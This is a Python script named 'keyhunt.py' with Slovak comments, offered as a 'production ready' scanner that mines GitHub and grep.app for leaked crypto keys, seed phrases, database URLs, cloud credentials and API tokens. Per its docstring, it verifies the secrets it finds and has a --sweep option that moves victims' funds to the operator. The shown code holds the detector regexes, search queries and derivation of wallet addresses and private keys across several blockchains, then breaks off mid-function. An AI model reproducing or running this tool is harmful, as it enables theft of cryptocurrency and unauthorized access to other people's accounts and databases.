#!/usr/bin/env python3
"""
keyhunt.py v4 — celosvetovy skener uniknutych tajomstiev. Production ready.

GitHub + grep.app -> krypto kluce, DB pristupy, cloud credentials, API kluce.
Co sa da, to AJ OVERI. Volitelne --sweep realne posle prostriedky k tebe.

Read-only, okrem --sweep.
"""
from __future__ import annotations

import argparse
import asyncio
import base64
import json
import os
import re
import sqlite3
import time
from dataclasses import dataclass
from urllib.parse import urlparse, unquote

import aiohttp
import base58 as b58
from aiohttp import BasicAuth
from bip_utils import (Bip39MnemonicValidator, Bip39SeedGenerator,
                       Bip44, Bip44Coins, Bip44Changes,
                       Bip84, Bip84Coins)
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solders.hash import Hash
from solders.message import MessageV0
from solders.transaction import VersionedTransaction
from solders.system_program import transfer, TransferParams

OPTIONAL = ("psycopg2", "pymysql", "redis", "pymongo", "boto3", "eth_account")
for _m in OPTIONAL:
    try:
        __import__(_m)
    except Exception:
        print(f"[!] chýba voliteľný modul: {_m}")

try:
    from bip_utils import Bip39WordsListGetter, Bip39Languages
    BIP39_WORDS = set(Bip39WordsListGetter().GetByLanguage(Bip39Languages.ENGLISH))
except Exception:
    BIP39_WORDS = set()

# ------------------------------------------------------------------ config
GH_TOKEN      = os.environ.get("GITHUB_TOKEN", "")
TG_TOKEN      = os.environ.get("TG_TOKEN", "")
TG_CHAT       = os.environ.get("TG_CHAT", "")
DB_PATH       = os.environ.get("KEYHUNT_DB", "keyhunt.db")
REFRESH_HOURS = int(os.environ.get("KEYHUNT_REFRESH_HOURS", "72"))
TIMEOUT       = int(os.environ.get("KEYHUNT_TIMEOUT", "8"))

TOKEN_PROGRAM = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
SYSTEM_PROGRAM = "11111111111111111111111111111111"
SOL_FEE = 5000

SOL_RPCS = ["https://api.mainnet-beta.solana.com",
            "https://solana-rpc.publicnode.com",
            "https://rpc.ankr.com/solana"]

EVM_RPCS = {
    "eth":      ["https://eth.llamarpc.com", "https://ethereum-rpc.publicnode.com"],
    "bsc":      ["https://bsc-rpc.publicnode.com", "https://binance.llamarpc.com"],
    "polygon":  ["https://polygon-rpc.com", "https://polygon-bor-rpc.publicnode.com"],
    "arbitrum": ["https://arb1.arbitrum.io/rpc", "https://arbitrum-one-rpc.publicnode.com"],
    "base":     ["https://mainnet.base.org", "https://base-rpc.publicnode.com"],
}
EVM_CHAINID = {"eth": 1, "bsc": 56, "polygon": 137, "arbitrum": 42161, "base": 8453}

ERC20 = {
    "eth":      [("0xdAC17F958D2ee523a2206206994597C13D831ec7", 6, "USDT"),
                 ("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", 6, "USDC")],
    "bsc":      [("0x55d398326f99059fF775485246999027B3197955", 18, "USDT"),
                 ("0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", 18, "USDC")],
    "polygon":  [("0xc2132D05D31c914a87C6611C10748AEb04B58e8F", 6, "USDT"),
                 ("0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", 6, "USDC")],
    "arbitrum": [("0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", 6, "USDT"),
                 ("0xaf88d065e77c8cC2239327C5EDb3A432268e5831", 6, "USDC")],
    "base":     [("0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", 6, "USDC")],
}

ESPLORA  = {"btc": "https://blockstream.info/api",
            "ltc": "https://litecoinspace.org/api"}
TRON_API = "https://api.trongrid.io"

# --- regex krypto
HEX0X = re.compile(r"\b0x([0-9a-fA-F]{64})\b")
HEX64 = re.compile(r"\b([0-9a-fA-F]{64})\b")
ARR   = re.compile(r"\[\s*(?:\d{1,3}\s*,\s*){63}\d{1,3}\s*\]")
B58K  = re.compile(r"\b([1-9A-HJ-NP-Za-km-z]{80,95})\b")
WORDS = re.compile(r"[a-zA-Z]+")
HINT  = re.compile(r"(?i)(private|secret|mnemonic|seed|keypair|deployer|\bkey\b|\bpk\b)")
VALID = Bip39MnemonicValidator()

# --- detektory: (meno, regex, kategoria, ci_overit)
DETECTORS = [
    ("db_postgres",  re.compile(r"postgres(?:ql)?://[^\s\"'<>\\]+"), "db", True),
    ("db_mongo",     re.compile(r"mongodb(?:\+srv)?://[^\s\"'<>\\]+"), "db", True),
    ("db_mysql",     re.compile(r"mysql://[^\s\"'<>\\]+"), "db", True),
    ("db_redis",     re.compile(r"rediss?://[^\s\"'<>\\]+"), "db", True),
    ("aws_pair",     re.compile(r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b"), "aws", True),
    ("ssh_key",      re.compile(r"-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----"), "other", False),
    ("gcp_sa",       re.compile(r'"type"\s*:\s*"service_account"'), "other", False),
    ("anthropic",    re.compile(r"\bsk-ant-[A-Za-z0-9_\-]{80,}\b"), "api", True),
    ("openrouter",   re.compile(r"\bsk-or-v1-[a-f0-9]{64}\b"), "api", True),
    ("openai",       re.compile(r"\bsk-(?:proj-)?[A-Za-z0-9_\-]{32,}\b"), "api", True),
    ("groq",         re.compile(r"\bgsk_[A-Za-z0-9]{40,}\b"), "api", True),
    ("perplexity",   re.compile(r"\bpplx-[A-Za-z0-9]{40,}\b"), "api", True),
    ("replicate",    re.compile(r"\br8_[A-Za-z0-9]{36,}\b"), "api", True),
    ("huggingface",  re.compile(r"\bhf_[A-Za-z0-9]{30,}\b"), "api", True),
    ("github",       re.compile(r"\b(?:gh[pousr]_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{60,})\b"), "api", True),
    ("gitlab",       re.compile(r"\bglpat-[A-Za-z0-9_\-]{20,}\b"), "api", True),
    ("google",       re.compile(r"\bAIza[0-9A-Za-z_\-]{35}\b"), "api", True),
    ("stripe",       re.compile(r"\b(?:sk|rk)_(?:live|test)_[A-Za-z0-9]{20,}\b"), "api", True),
    ("sendgrid",     re.compile(r"\bSG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}\b"), "api", True),
    ("mailgun",      re.compile(r"\bkey-[0-9a-f]{32}\b"), "api", True),
    ("slack_webhook",re.compile(r"https://hooks\.slack\.com/services/[A-Za-z0-9/+]{40,}"), "api", True),
    ("slack_bot",    re.compile(r"\bxox[baprs]-[A-Za-z0-9\-]{10,}\b"), "api", True),
    ("discord_wh",   re.compile(r"https://(?:ptb\.|canary\.)?discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_\-]+"), "api", True),
    ("telegram_bot", re.compile(r"\b\d{8,10}:[A-Za-z0-9_\-]{35}\b"), "api", True),
    ("digitalocean", re.compile(r"\bdop_v1_[0-9a-f]{64}\b"), "api", True),
    ("netlify",      re.compile(r"\bnfp_[A-Za-z0-9]{40,}\b"), "api", True),
    ("notion",       re.compile(r"\b(?:secret_|ntn_)[A-Za-z0-9]{40,}\b"), "api", True),
    ("linear",       re.compile(r"\blin_api_[A-Za-z0-9]{40,}\b"), "api", True),
    ("npm",          re.compile(r"\bnpm_[A-Za-z0-9]{36}\b"), "api", True),
    ("infura",       re.compile(r"infura\.io/v3/([0-9a-fA-F]{32})"), "api", True),
    ("alchemy",      re.compile(r"alchemy\.com/v2/([A-Za-z0-9_\-]{20,})"), "api", True),
    ("sentry",       re.compile(r"https://[0-9a-f]{32}@o\d+\.ingest\.sentry\.io/\d+"), "api", True),
    ("mapbox",       re.compile(r"\bpk\.[A-Za-z0-9_\-]{60,}\b"), "api", True),
    ("twilio",       re.compile(r"\bSK[0-9a-f]{32}\b"), "other", False),
    ("firebase",     re.compile(r"AAAA[A-Za-z0-9_\-]{7}:[A-Za-z0-9_\-]{140,}"), "other", False),
]

HINTS = [
    "DATABASE_URL", "postgres://", "mongodb+srv://", "redis://", "mysql://",
    "AWS_SECRET_ACCESS_KEY", "OPENAI_API_KEY", "ANTHROPIC_API_KEY",
    "OPENROUTER_API_KEY", "GROQ_API_KEY", "REPLICATE_API_TOKEN",
    "PERPLEXITY_API_KEY", "HUGGINGFACE", "GITHUB_TOKEN", "GITLAB_TOKEN",
    "STRIPE_SECRET_KEY", "SENDGRID_API_KEY", "MAILGUN_API_KEY",
    "SLACK_BOT_TOKEN", "DISCORD_WEBHOOK", "TELEGRAM_BOT_TOKEN",
    "DIGITALOCEAN_TOKEN", "NETLIFY_AUTH_TOKEN", "NOTION_TOKEN",
    "LINEAR_API_KEY", "NPM_TOKEN", "INFURA", "ALCHEMY_API_KEY", "SENTRY_DSN",
    "MAPBOX_TOKEN", "GOOGLE_MAPS_API_KEY", "TWILIO_AUTH_TOKEN", "FIREBASE",
    "SOLANA_PRIVATE_KEY", "MNEMONIC", "PRIVATE_KEY", "secretKey",
    "service_account",
]
QUERIES = [f'"{h}" extension:env' if (h.isupper() or "_" in h) else f'"{h}"' for h in HINTS]
QUERIES += ['"postgres://"', '"mongodb+srv://"', '"secretKey" extension:json',
            '"PRIVATE_KEY" extension:env']


# ------------------------------------------------------------------ krypto extrakcia
def find_mnemonics(text: str):
    if len(text) > 4000:
        text = text[:4000]
    w = WORDS.findall(text.lower())
    if len(w) < 12:
        return set()
    if BIP39_WORDS and w[0] not in BIP39_WORDS:
        pass
    out = set()
    for n in (24, 21, 18, 15, 12):
        for i in range(len(w) - n + 1):
            if BIP39_WORDS and (w[i] not in BIP39_WORDS or w[i + n - 1] not in BIP39_WORDS):
                continue
            ph = " ".join(w[i:i + n])
            if VALID.IsValid(ph):
                out.add(ph)
    return out


def _sol_array(m):
    try:
        a = json.loads(m)
        if len(a) == 64 and all(0 <= x <= 255 for x in a):
            return tuple(a)
    except Exception:
        pass
    return None


def find_secrets(text: str):
    out = set()
    for line in text.splitlines():
        hot = bool(HINT.search(line))
        if hot:
            for m in HEX0X.findall(line) + HEX64.findall(line):
                out.add(("hex", m))
            for m in B58K.findall(line):
                try:
                    if len(b58.b58decode(m)) == 64:
                        out.add(("sol_b58", m))
                except Exception:
                    pass
        for m in ARR.findall(line):
            v = _sol_array(m)
            if v:
                out.add(("sol_array", v))
        if hot and len(line.split()) >= 12:
            for m in find_mnemonics(line):
                out.add(("mnemonic", m))
        if hot:
            for m in HEX0X.findall(line):
                out.add(("hex", m))
    return out


def _strip_url(u: str) -> str:
    return u.rstrip(')]},;\\\'"')


def find_other_secrets(text: str):
    out = {}
    for name, rx, cat, check in DETECTORS:
        for m in rx.finditer(text):
            val = m.group(1) if m.groups() else m.group(0)
            if cat == "db":
                val = _strip_url(val)
            if val not in out:
                out[val] = {"name": name, "cat": cat, "check": check}
    m = re.search(r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b", text)
    if m:
        sm = re.search(r"(?i)aws[_\-]?secret[_\-]?access[_\-]?key[^\n]{0,15}?"
                       r"[\"'=\s]+([A-Za-z0-9/+=]{40})", text)
        if sm:
            out[f"{m.group(0)}:{sm.group(1)}"] = {"name": "aws_pair", "cat": "aws", "check": True}
    return out


# ------------------------------------------------------------------ targety
@dataclass
class Target:
    addr: str
    chain: str
    kind: str
    secret: str
    repo: str
    path: str
    index: int


def derive_targets(kind, secret, repo, path, max_index, chains):
    out = []
    def mk(a, c, i):
        if a:
            out.append(Target(a, c, kind, secret, repo, path, i))

    if kind == "hex":
        kb = bytes.fromhex(secret)
        if "evm" in chains:
            try:
                mk(Bip44.FromPrivateKey(kb, Bip44Coins.ETHEREUM)
                   .PublicKey().ToAddress(), "evm:eth", 0)
            except Exception:
                pass
        if "sol" in chains:
            try:
                mk(str(Keypair.from_seed(kb).pubkey()), "solana", 0)
            except Exception:
                pass
        return out

    if kind in ("sol_array", "sol_b58"):
        if "sol" in chains:
            try:
                raw = bytes(secret) if kind == "sol_array" else b58.b58decode(secret)
                mk(str(Keypair.from_bytes(raw).pubkey()), "solana", 0)
            except Exception:
                pass
        return out

    seed = Bip39SeedGenerator(secret).Generate()
    for i in range(max_index + 1):
        if "sol" in chains:
            try:
                k = (Bip44.FromSeed(seed, Bip44Coins.SOLANA).Purpose().Coin()
                     .Account(i).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0))
                mk(b58.b58encode(k.PublicKey().RawCompressed().ToBytes()[1:]).decode(), "solana", i)
            except Exception:
                pass
        if "evm" in chains:
            try:
                a = (Bip44.FromSeed(seed, Bip44Coins.ETHEREUM).Purpose().Coin()
                     .Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                     .PublicKey().ToAddress())
                for ch in EVM_RPCS:
                    mk(a, f"evm:{ch}", i)
            except Exception:
                pass
        if "btc" in chains:
            for cls, coins in ((Bip44, Bip44Coins.BITCOIN),
                               (Bip84, Bip84Coins.BITCOIN)):
                try:
                    mk(cls.FromSeed(seed, coins).Purpose().Coin().Account(0)
                       .Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                       .PublicKey().ToAddress(), "btc", i)
                except Exception:
                    pass
        if "ltc" in chains:
            try:
                mk(Bip44.FromSeed(seed, Bip44Coins.LITECOIN).Purpose().Coin()
                   .Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                   .PublicKey().ToAddress(), "ltc", i)
            except Exception:
                pass
        if "tron" in chains:
            try:
                mk(Bip44.FromSeed(seed, Bip44Coins.TRON).Purpose().Coin()
                   .Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                   .PublicKey().ToAddress(), "tron", i)
            except Exception:
                pass
    return out


def privkey_for(hit):
    """Vráti privátny kľúč pre sweep. None ak sa nedá."""
    kind, secret, idx = hit["kind"], hit["secret"], hit["index"]
    try:
        if kind == "mnemonic":
            seed = Bip39SeedGenerator(secret).Generate()
            if hit["chain"] == "solana":
                return ("sol", (Bip44.FromSeed(seed, Bip44Coins.SOLANA).Purpose().Coin()
                                .Account(idx).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
                                .PrivateKey().Raw().ToBytes()))
            return ("evm", (Bip44.FromSeed(seed, Bip44Coins.ETHEREUM).Purpose().Coin()
                            .Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(idx)
                            .PrivateKey().Raw().ToBytes()))
        if kind == "hex":
            kb = bytes.fromhex(secret)
